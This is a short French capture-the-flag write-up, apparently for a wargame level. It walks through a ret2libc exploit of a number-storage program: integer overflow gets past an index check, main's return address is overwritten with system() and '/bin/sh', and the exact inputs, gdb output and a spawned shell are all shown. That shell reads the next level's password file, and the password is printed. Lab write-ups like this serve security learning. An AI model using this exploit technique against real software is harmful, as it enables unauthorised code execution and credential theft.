#### Etape 1 : Décompilation

Le programme propose trois instructions :
- store qui permet de spécifier un numéro et un index dans lequel l'enregistrer.
    Si l'index est un multiple de 3 le code empeche de stocker la valeur.
    L'index spécifier est multiplié par 4 avant de stocker la valeur.
- read qui permet le lire le numéro stocké a l'index demandé.
- quit qui quitte le programme via un return.

#### Etape 2 : Objectif

L'idée est de réécrire l'adresse de return de main en stockant l'adresse de la fonction system a la place. 
Et la faire suivre par /bin/sh.

#### Etape 3 : Infos 

Les valeurs sont des %u d'un scanf il faut donc les avoir au format décimal.
L'adresse en décimal de :
- system : 4159090384
- /bin/sh : 4160264172 
Obtenir l'adresse d'écriture et du return de main pour savoir a quel index écrire.
Mettre un break sur le return de main et sur store_number via gdb.
Lire l'adresse d'esp qui pointe vers l'adresse de retour.
```bash
Breakpoint 1, 0x080488ea in main ()
(gdb) x/x $esp
0xffffd530:     0xffffd554
Breakpoint 2, 0x080489f1 in main ()
(gdb) x/x $esp
0xffffd71c:     0xf7e45513
```
On a ainsi obtenu l'adresse à partir de laquelle on écrit : 0xffffd554 et celle à laquelle on souhaite modifier la valeur : 0xffffd71c.
0xffffd71c - 0xffffd554 = 456.
On divise par 4 pour obtenir l'index a entrer dans le programme : 456 / 4 = 114.
Cet index est un multiple de 3 mais il possible d'obtenir 114 en utilisant le dépassement de valeur d'un int: 1073741938 * 4 = 114.

#### Etape 4 : Execution 
```bash
Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$ whoami
level08
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```

